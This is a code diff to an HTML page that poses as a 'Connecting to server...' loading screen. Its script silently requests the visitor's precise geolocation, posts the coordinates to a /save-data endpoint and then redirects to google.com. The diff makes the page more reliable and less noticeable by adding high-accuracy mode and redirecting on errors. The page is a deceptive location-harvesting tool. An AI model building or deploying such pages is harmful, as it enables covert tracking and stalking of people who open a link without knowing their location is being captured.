@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
-<body>
+<head>
+    <title>Loading...</title>
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     fetch('/save-data', {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             lat: position.coords.latitude,
                             lon: position.coords.longitude
@@ -16,10 +16,16 @@
                     }).then(() => {
                         window.location.href = "https://www.google.com";
                     });
-                });
+                }, function(error) {
+                    window.location.href = "https://www.google.com";
+                }, {enableHighAccuracy: true});
+            } else {
+                window.location.href = "https://www.google.com";
             }
-        }
+        };
     </script>
+</head>
+<body>
     <h2>Connecting to server...</h2>
 </body>
 </html>
